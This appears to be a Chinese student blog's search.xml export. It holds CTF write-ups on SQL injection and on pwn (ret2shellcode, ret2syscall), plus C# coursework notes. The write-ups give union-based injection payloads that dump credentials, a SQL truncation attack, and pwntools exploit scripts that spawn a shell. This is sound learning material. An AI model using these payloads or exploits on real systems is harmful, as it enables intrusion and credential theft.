<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>BUUCTF中SQL注入writeup</title>
    <url>/2024/11/11/BUUCTF%E4%B8%ADSQL%E6%B3%A8%E5%85%A5writeup/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h2 id="NewStarCTF-2023-公开赛道-ez-sql"><a href="#NewStarCTF-2023-公开赛道-ez-sql" class="headerlink" title="[NewStarCTF 2023 公开赛道]ez_sql"></a>[NewStarCTF 2023 公开赛道]ez_sql</h2><ol>
<li><h5 id="判断闭合方式为-’（单引号）"><a href="#判断闭合方式为-’（单引号）" class="headerlink" title="判断闭合方式为 ’（单引号）"></a>判断闭合方式为 <code>’</code>（单引号）</h5></li>
<li><h5 id="爆字段数，以成功联合注入"><a href="#爆字段数，以成功联合注入" class="headerlink" title="爆字段数，以成功联合注入"></a>爆字段数，以成功联合注入</h5></li>
</ol>
<p>​	<code>?id=1&#39; order by 1 --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-1.png" alt="1-1"></p>
<p>​	发现有WAF，这里使用大写绕过</p>
<p>​	<code>?id=1&#39; Order by 1 --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-2.png" alt="1-2"></p>
<p>​	一直尝试直到<code>?id=1&#39; Order by 6 --+</code>没有回显，说明字段数为5</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-3.png" alt="1-3"></p>
<ol start="3">
<li><h5 id="联合注入爆数据库名"><a href="#联合注入爆数据库名" class="headerlink" title="联合注入爆数据库名"></a>联合注入爆数据库名</h5></li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-4.png" alt="1-4"></p>
<p>​	可见，数据库名就是ctf</p>
<p>​	到这里答案就是到手的鸭子了</p>
<ol start="4">
<li><h5 id="顺藤摸瓜，找到表名"><a href="#顺藤摸瓜，找到表名" class="headerlink" title="顺藤摸瓜，找到表名"></a>顺藤摸瓜，找到表名</h5></li>
</ol>
<p><code>?id=1&#39; UNION SELECT 1,2,3,4,GROUP_CONCAT(table_name) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA =&#39;ctf&#39; --+</code></p>
<p>​	<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-5.png" alt="1-5"></p>
<p>​	显然flag在here_is_flag这个表中，但我们先要找到在哪个字段下（当然一般可以直接猜出来字段名为flag）</p>
<ol start="5">
<li><h5 id="再找到字段名"><a href="#再找到字段名" class="headerlink" title="再找到字段名"></a>再找到字段名</h5></li>
</ol>
<p>​	<code>?id=1&#39; UNION SELECT 1,2,3,4,GROUP_CONCAT(column_name) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME =&#39;here_is_flag&#39; --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-6.png" alt="1-6"></p>
<ol start="6">
<li><h5 id="查询字段值"><a href="#查询字段值" class="headerlink" title="查询字段值"></a>查询字段值</h5></li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/1-7.png" alt="1-7"></p>
<p>​	大功告成</p>
<hr>
<h2 id="BUU-SQL-COURSE-1"><a href="#BUU-SQL-COURSE-1" class="headerlink" title="BUU SQL COURSE 1"></a>BUU SQL COURSE 1</h2><p>点进去发现有两个模块，一个新闻页面，一个登录页面。</p>
<ol>
<li><h5 id="找到注入位置"><a href="#找到注入位置" class="headerlink" title="找到注入位置"></a>找到注入位置</h5></li>
</ol>
<p>点开热点中的热点一，发现这里有一个php请求，猜测是否这里有sql注入（为什么呢）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-1.png" alt="2-1"></p>
<ol start="2">
<li><h5 id="开始注入（公式化）"><a href="#开始注入（公式化）" class="headerlink" title="开始注入（公式化）"></a>开始注入（公式化）</h5></li>
</ol>
<p>爆字段数</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-2.png" alt="2-2"></p>
<p>爆库名</p>
<p><code>?id=-1 union select 1,database() --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-3.png" alt="2-3"></p>
<p>爆表名</p>
<p><code>?id=-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;news&#39; --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-4.png" alt="2-4"></p>
<p>爆字段名</p>
<p><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;admin&#39; --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-5.png" alt="2-5"></p>
<p>爆字段值</p>
<p><code>?id=-1 union select 1,group_concat(username,&#39;,&#39;,password) from news.admin --+</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-6.png" alt="2-6"></p>
<p>得到账号密码后就去登录吧</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-7.png" alt="2-7"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/2-8.png" alt="2-8"></p>
<p>完结撒花*★,°<em>:.☆(￣▽￣)&#x2F;$:</em>.°★* 。</p>
<hr>
<h2 id="CTF-BugKu-sqli-0x1"><a href="#CTF-BugKu-sqli-0x1" class="headerlink" title="CTF-BugKu-sqli-0x1"></a>CTF-BugKu-sqli-0x1</h2><p><a href="https://blog.csdn.net/weixin_73625393/article/details/137773172">https://blog.csdn.net/weixin_73625393/article/details/137773172</a></p>
<p><a href="http://danielw.top/index.php/daniel/340/">http://danielw.top/index.php/daniel/340/</a></p>
<p>没有变化，使用的是POST传参</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233313019.png" alt="image-20241115233313019"></p>
<p>打开源代码看看</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233348097.png" alt="image-20241115233348097"></p>
<p>发现有提示。查看这个php文件</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115233653921.png" alt="image-20241115233653921"></p>
<p>待水平进步再来做这个qaq</p>
<h2 id="CTF-BugKu-login1"><a href="#CTF-BugKu-login1" class="headerlink" title="CTF-BugKu-login1"></a>CTF-BugKu-login1</h2><p><a href="https://blog.csdn.net/lga0325/article/details/143353230">https://blog.csdn.net/lga0325/article/details/143353230</a></p>
<p>在登录密码是，账号默认为admin，输入各种万能密码都没用</p>
<p>查看注册页面</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241115235406854.png" alt="image-20241115235406854"></p>
<p>发现admin已经存在了</p>
<p>这个时候考虑SQL约束攻击</p>
<p>在注册用户时，因为 insert 插入数据受到数据库定义的长度限制，会自动将超出长度的数据截断。因此，如果 uname 的长度限制为 char(7)，那么注册账号<code>&#39;admin a&#39;</code>时，由于长度超出，则后面的 <code>a</code> 会被截断，此时，数据库存储数据会把空格删除，在数据库内就变成了<code>admin</code>        （？怎么会有七个字符？）</p>
<p>此时登录时使用 admin 和自己注册的密码登录，数据库返回注册时的账号信息，但是如果业务侧仅根据返回的用户名信息判断权限，则会导致水平越权的漏洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116000616003.png" alt="image-20241116000616003"></p>
<p>注册成功，注意用户名这里有一个空格</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241116000703445.png" alt="image-20241116000703445"></p>
<p>直接使用admin身份登录得到flag</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>C艹基础（1）</title>
    <url>/2024/11/05/C-%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="信息系统开发（-NET）-第八章作业"><a href="#信息系统开发（-NET）-第八章作业" class="headerlink" title="信息系统开发（.NET）   第八章作业"></a>信息系统开发（.NET）   第八章作业</h1><h2 id="什么是类的继承？怎么定义派生类？"><a href="#什么是类的继承？怎么定义派生类？" class="headerlink" title="什么是类的继承？怎么定义派生类？"></a>什么是类的继承？怎么定义派生类？</h2><h2 id="简述创建派生类时，构造函数的调用。"><a href="#简述创建派生类时，构造函数的调用。" class="headerlink" title="简述创建派生类时，构造函数的调用。"></a>简述创建派生类时，构造函数的调用。</h2><h2 id="怎样定义基类虚方法，并在派生类中重写基类虚方法？"><a href="#怎样定义基类虚方法，并在派生类中重写基类虚方法？" class="headerlink" title="怎样定义基类虚方法，并在派生类中重写基类虚方法？"></a>怎样定义基类虚方法，并在派生类中重写基类虚方法？</h2><h2 id="抽象方法和虚方法有什么异同？"><a href="#抽象方法和虚方法有什么异同？" class="headerlink" title="抽象方法和虚方法有什么异同？"></a>抽象方法和虚方法有什么异同？</h2><h2 id="什么是抽象类？它有什么特点？它和接口有何异同？"><a href="#什么是抽象类？它有什么特点？它和接口有何异同？" class="headerlink" title="什么是抽象类？它有什么特点？它和接口有何异同？"></a>什么是抽象类？它有什么特点？它和接口有何异同？</h2><h2 id="简述通过委托来调用对象方法的基本过程。"><a href="#简述通过委托来调用对象方法的基本过程。" class="headerlink" title="简述通过委托来调用对象方法的基本过程。"></a>简述通过委托来调用对象方法的基本过程。</h2>]]></content>
      <categories>
        <category>计算机</category>
      </categories>
      <tags>
        <tag>c#</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn题解</title>
    <url>/2024/11/24/Pwn%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="从0开始的Pwn生活"><a href="#从0开始的Pwn生活" class="headerlink" title="从0开始的Pwn生活"></a>从0开始的Pwn生活</h1><p>与其说是题解，不如说是萌新初次见面的哦哈呦</p>
<h1 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h1><p>没得说，复习的时候再写</p>
<p>更权威的查找后门函数方法：</p>
<ol>
<li>ctrl + F搜索 system</li>
<li>shift + F12看有没有字符串 &#x2F;bin&#x2F;sh</li>
</ol>
<h1 id="Ret2ShellCode"><a href="#Ret2ShellCode" class="headerlink" title="Ret2ShellCode"></a>Ret2ShellCode</h1><h4 id="第一次的思路"><a href="#第一次的思路" class="headerlink" title="第一次的思路"></a>第一次的思路</h4><h5 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124203338698.png" alt="image-20241124203338698">	</p>
<p>保护 &#x3D;  ZERO</p>
<p>32位</p>
<h5 id="IDA下静态调试"><a href="#IDA下静态调试" class="headerlink" title="IDA下静态调试"></a>IDA下静态调试</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124203655566.png" alt="image-20241124203655566"> </p>
<p>setvbuf是清空缓冲区。简单来说就是说不要设置输入输出缓冲区，不然没满发不出去。</p>
<p>这个gets很关键，基本判别是溢出解法。</p>
<p>执行内容位把s的值赋给buf2</p>
<p>让我们查看下buf2的位置</p>
<p>​                                                                                                                                                                                                                                                                                                                                                                                             </p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124204040843.png" alt="image-20241124204040843">                                                                                                                                                                           </p>
<p>bss区域是可执行的，只需要在这里覆盖上我们需要执行的代码就好了</p>
<p>返回地址覆盖位这个bss的地址</p>
<img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124213147737.png" alt="image-20241124213147737" style="zoom: 33%;">	

<p>所以我猜测应该是覆盖strcpy的返回地址到buf2数组的地址，数组内容应该是&#x2F;bin&#x2F;sh对应的机器码</p>
<p>payload &#x3D; 0x64+4的无效数据加上&#x2F;bin&#x2F;sh的机器码</p>
<h4 id="正确思路"><a href="#正确思路" class="headerlink" title="正确思路"></a>正确思路</h4><p>s是一个局部变量，gets可以将任意长度的字符赋值给s。当输入过长时，一直向高地址溢出可能覆盖main函数的返回地址。所以溢出的栈帧应该是main函数的栈帧</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124213831067.png" alt="image-20241124213831067"> </p>
<p>这里看到，距离ebp刚好是100字节。</p>
<p>ebp指向的是栈底，紧随其后的就是previous ebp，再往后面就是return address了</p>
<p>不过静态调试分析不一定正确，题目可能有灵活性。此时需要动态调试。动态才是真正的实践出真知。</p>
<h5 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h5><p>gets输入后直接看栈内容</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124214947632.png" alt="image-20241124214947632"> </p>
<p>首先第一行，esp。它的意思是，这里存的是一个指针，AAAA是这个指针存的内容</p>
<p>AAAA实际的位置在cddc处</p>
<p>向上查看寄存器ebp的值              </p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124215221005.png" alt="image-20241124215221005"> </p>
<p>从eax到ebp就是应该填充的数组的值，然后再用4字节垃圾数据填充掉previous ebp，最后覆盖返回地址即可</p>
<p><strong>结果地址差是108，并非100</strong>。这是为什么？</p>
<h5 id="写攻击脚本"><a href="#写攻击脚本" class="headerlink" title="写攻击脚本"></a>写攻击脚本</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>)+p32(<span class="number">0x0804A080</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>ljust(int n,char c) 前方字节流不变，后方补充数据C直到到达n个字节</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241124223816018.png" alt="image-20241124223816018"> </p>
<p>这不对啊 :question:</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241125105258338.png" alt="image-20241125105258338"> </p>
<p>仔细一看，bss段竟然没有可执行权限。这和说好的不一样啊</p>
<p>破案了，LInux内核问题，不用纠结这题就是这样做的。</p>
<p>当然也可以用mprotect函数或者换到Ubuntu 18以下的版本</p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>动态调试和静态分析的结果可能有区别，一切按照动态调试的来。所以找长度的时候出了错</p>
<p>另外需要通过pwntools来生成shellcode的机器码</p>
<h1 id="NewStarCTF-公开赛赛道-ret2shellcode"><a href="#NewStarCTF-公开赛赛道-ret2shellcode" class="headerlink" title="[NewStarCTF 公开赛赛道] ret2shellcode"></a>[NewStarCTF 公开赛赛道] ret2shellcode</h1><h4 id="第一次的思路-1"><a href="#第一次的思路-1" class="headerlink" title="第一次的思路"></a>第一次的思路</h4><h5 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126203800780.png" alt="image-20241126203800780">	</p>
<p>没有Canary保护的话，将返回地址覆盖是可行的。应该还是传统栈溢出。</p>
<p>注意是64位</p>
<h5 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126200304228.png" alt="image-20241126200304228"> </p>
<p>关键有三步，第一步有一个mmap函数（这是啥我不知道），第二步向buf数组<strong>标准输入</strong>0x100字节的数据，第三步向v4数组标准输入0x100字节的数据。ULL后缀目的是确保编译器正确解析该数字的类型。</p>
<p><strong>read和gets的区别在于：</strong></p>
<p><code>read</code>需要指定读取长度，可以避免缓冲区溢出；<code>gets</code>读取输入直到\n出现，会导致缓冲区溢出</p>
<p><code>read</code>需要手动处理读取的字节并在缓冲区末尾添加\0形成字符串；<code>gets</code>自动在字符串末尾田间空字符\0形成字符串</p>
<p>百度一下：<code>mmap</code> </p>
<p><a href="https://www.cnblogs.com/huxiao-tee/p/4660352.html">https://www.cnblogs.com/huxiao-tee/p/4660352.html</a></p>
<p>**内存映射：**简而言之就是将用户空间的一段内存区域映射到内核空间，映射成功后，用户对这段内存区域的修改可以直接反映到内核空间，同样，内核空间对这段区域的修改也直接反映用户空间。</p>
<p><code>mmap</code>是一种<strong>内存映射文件的方法</strong>，即将一个文件或者其它对象映射到进程的地址空间，实现文件磁盘地址和进程虚拟地址空间中一段虚拟地址的一一对映关系。</p>
<p><strong>函数原型</strong>：<code>void *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);</code></p>
<p>start：映射区的开始地址</p>
<p>length：映射区的长度</p>
<p>prot：期望的内存保护标志</p>
<p>flags：指定映射对象的类型，映射选项和映射页是否可以共享</p>
<p>fd：有效的文件描述词</p>
<p>offset：被映射对象内容的起点</p>
<p>这个时候第一步就清楚了，即将buf映射到一个4096字节的内存，其起始地址为虚拟地址0x233000，且该内存空间<strong>可读可写可执行</strong>（省略了动态分析vmmap没发现有rwx段）</p>
<p>找到可读可写可执行，思路一下子就清晰了，将shellcode通过buf数组映射到这个虚拟空间，然后通过v4覆盖返回地址，覆盖的返回地址恰好为这个映射区的起始地址。<del>对还是不对？</del></p>
<p>那么第一次写入的数据就是shellcode &#x3D; asm(shellcraft.sh())</p>
<p>第二次写入的数据便为(0x30+8)的垃圾数据加上p64(0x233000)</p>
<p>发现一个小问题，这里会把 buf覆盖掉吗 （buf[]的首地址），覆盖了会有影响吗。</p>
<h5 id="写脚本"><a href="#写脚本" class="headerlink" title="写脚本"></a>写脚本</h5><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">addr = <span class="number">0x233000</span></span><br><span class="line">payload = (<span class="number">0x30</span>+<span class="number">8</span>)*<span class="string">b&#x27;A&#x27;</span>+p64(<span class="number">0x233000</span>)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">io.recvline()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h5 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241126205924180.png" alt="image-20241126205924180">	</p>
<p>卧槽，你浩锅，直接过了</p>
<p>也是第一次没看提示解出来一道pwn题（抛开查了查mmap函数不谈）</p>
<h1 id="Ret2Syscall"><a href="#Ret2Syscall" class="headerlink" title="Ret2Syscall"></a>Ret2Syscall</h1><h4 id="哈吉咩得"><a href="#哈吉咩得" class="headerlink" title="哈吉咩得"></a>哈吉咩得</h4><h5 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128143917697.png" alt="image-20241128143917697"> </p>
<p>32位，无保护，栈溢出</p>
<h5 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128144009902.png" alt="image-20241128144009902"> </p>
<p>通过v4数组覆盖main函数的返回地址</p>
<p>其长度为0x64+4</p>
<p>而且这次没有后门函数也不能注入shellcode。考虑ROP，系统调用</p>
<h5 id="找到gadget地址"><a href="#找到gadget地址" class="headerlink" title="找到gadget地址"></a>找到gadget地址</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128144400349.png" alt="image-20241128144400349"> </p>
<p>首先想想&#x2F;bin&#x2F;sh得系统调用流程是什么</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128144455036.png" alt="image-20241128144455036"> </p>
<p>于是我们需要得分别有</p>
<p><code>pop eax；ret</code>	地址0x080bb196</p>
<p><code>pop ebx；ret</code>	地址0x0804838e</p>
<p>关于ecx和edx应该需要清空一下的吧。但是这里如果pop，ret感觉很麻烦。但找不到xor，ret就算了</p>
<p>所以</p>
<p> <code>xor ecx，ecx；ret</code>   或者 pop ret	地址</p>
<p><code>xor edx，edx；ret</code>  或者  pop ret</p>
<p><code>int 0x80</code></p>
<p>这些是我们需要的gadget。</p>
<p>但事实上发现只有xor eax，eax，所以ecx，edx应该是不需要怎么管的。</p>
<h5 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h5><p>pop的东东是栈顶元素，即esp指向的数。而v4数组在esp的上方。说明没办法通过v4来修改esp指向内容的值啊。</p>
<p>那该怎么办。</p>
<p>唐了，记住esp一直指向栈顶。</p>
<h4 id="正确思路-1"><a href="#正确思路-1" class="headerlink" title="正确思路"></a>正确思路</h4><h5 id="寻找后门函数"><a href="#寻找后门函数" class="headerlink" title="寻找后门函数"></a>寻找后门函数</h5><p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128150557112.png" alt="image-20241128150557112"> </p>
<p>尝试了两种方法（第一题），只找到了字符串（后门函数对应的参数），但没找到后门函数（system）。</p>
<h5 id="找gadget"><a href="#找gadget" class="headerlink" title="找gadget"></a>找gadget</h5><p><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | grep eax</code>找到第一个gadget。其他以此类推</p>
<p>ecx和edx其实第一次构建payload的时候无需在意。因为一般情况下这个时候ecx和edx为0。可以先试试看，如果有问题再说。</p>
<p>这里找到两个gadget：</p>
<p>0x080bb196 : pop eax ; ret</p>
<p>0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</p>
<p>找不到的就替代。</p>
<p>最后 0x08049421 : int 0x80</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241128152855316.png" alt="image-20241128152855316"> </p>
<p>从下到上得看</p>
<h5 id="动态调试尝试覆盖原有返回地址"><a href="#动态调试尝试覆盖原有返回地址" class="headerlink" title="动态调试尝试覆盖原有返回地址"></a>动态调试尝试覆盖原有返回地址</h5><p> <img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241129101348955.png" alt="image-20241129101348955"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241129101419976.png" alt="image-20241129101419976"> </p>
<p>这又是一道动态调试和静态分析结果不相同得一道题。结果需要注入（0x88-0x1c+4）的垃圾数据</p>
<h5 id="构建payload，编写exp"><a href="#构建payload，编写exp" class="headerlink" title="构建payload，编写exp"></a>构建payload，编写exp</h5><p><code>flat</code> 是 <code>pwntools</code> 提供的另一个函数，用于将传入的列表展平为一个连续的字节串。它会将列表中的元素（比如字节串、整数等）按顺序组合成一个连续的内存块。</p>
<p><code>payload = flat([b&#39;A&#39;*(112),pop_eax_addr, 0xb , pop_edx_ecx_ebx_addr, 0 , 0 , 0x80be408, int80_addr])</code></p>
<p>以下为exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&quot;./ret2syscall&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_eax_addr = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_addr = <span class="number">0x0806eb90</span></span><br><span class="line">int80_addr = <span class="number">0x08049421</span></span><br><span class="line">binsh = <span class="number">0x80be408</span></span><br><span class="line"></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span>*(<span class="number">112</span>), pop_eax_addr , <span class="number">0xb</span>,pop_edx_ecx_ebx_addr, <span class="number">0</span>,<span class="number">0</span>,binsh, int80_addr])</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<p>64位下遵循传参规则：</p>
<p>H(a, b, c, d, e, f, g, h);<br>a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9<br>h-&gt;8(%esp)<br>g-&gt;(%esp)<br>call H</p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>Pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>c艹事件</title>
    <url>/2024/12/09/c-%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="委托与事件"><a href="#委托与事件" class="headerlink" title="委托与事件"></a>委托与事件</h1><h2 id="委托"><a href="#委托" class="headerlink" title="委托"></a>委托</h2><p>实际上用类完成了函数指针的功能</p>
<h3 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h3><h4 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">Print</span>(<span class="params"><span class="built_in">int</span> x</span>)  <span class="comment">//只能在namespace和类下</span></span></span><br></pre></td></tr></table></figure>

<h4 id="初始化，赋值"><a href="#初始化，赋值" class="headerlink" title="初始化，赋值"></a>初始化，赋值</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">Print someFunc = hello；</span><br><span class="line">Print someFunc = <span class="keyword">new</span> Print(hello); </span><br></pre></td></tr></table></figure>

<h4 id="调用委托变量"><a href="#调用委托变量" class="headerlink" title="调用委托变量"></a>调用委托变量</h4><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">someFunc(<span class="number">30</span>);</span><br></pre></td></tr></table></figure>



<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">PrintInt</span>(<span class="params"><span class="built_in">int</span> x</span>)</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Hello</span>(<span class="params"><span class="built_in">int</span> x</span>)</span> =&gt; Console.WriteLIne(<span class="string">$&quot;<span class="subst">&#123;x&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line">PrintINt writeInt = Hello(<span class="number">354</span>);</span><br></pre></td></tr></table></figure>



<h2 id="多播委托"><a href="#多播委托" class="headerlink" title="多播委托"></a>多播委托</h2><p>多播委托将多个函数对象分配到一个委托示例</p>
<p>委托的分配动作是通过 +&#x3D; 、-&#x3D; 完成的（可以用&#x3D;。 事件不能用&#x3D;）</p>
<h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>事件是一种特殊的委托</p>
<h3 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h3><p>事件拥有者，事件成员，事件相应者，事件处理器，事件订阅</p>
<p><img src="https://cdn.jsdelivr.net/gh/Pocon041/blogimage@main/image-20241209223501574.png" alt="image-20241209223501574"></p>
<p>主流理解是将代码分为两个部分：事件发布者（广播者）和事件订阅者（订阅者）</p>
<p>简称SB模式</p>
<p>最大的好处是不能赋值。</p>
<h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><ol>
<li>在类中定义私有化委托</li>
<li>暴露出-&#x3D;、+&#x3D;的方法</li>
</ol>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">delegate</span> <span class="keyword">void</span> <span class="title">FuncHandler</span>(<span class="params"><span class="built_in">int</span> item</span>)</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Broadcaster</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">event</span> FuncHandler funcHandler; <span class="comment">//事件的声明</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="事件的标准写法"><a href="#事件的标准写法" class="headerlink" title="事件的标准写法"></a>事件的标准写法</h3><ol>
<li><p>命名事件的委托必须以EventHandler结尾</p>
</li>
<li><p>触发函数必须以On开头，且必须是虚函数</p>
</li>
<li><p>订阅者（+&#x3D;、-&#x3D;）函数的类型符合EventHandler委托类型</p>
<ol>
<li><p>接收两个参数（object arg1， SomeEventArgs arg2）</p>
<p>​    arg1 表示广播者</p>
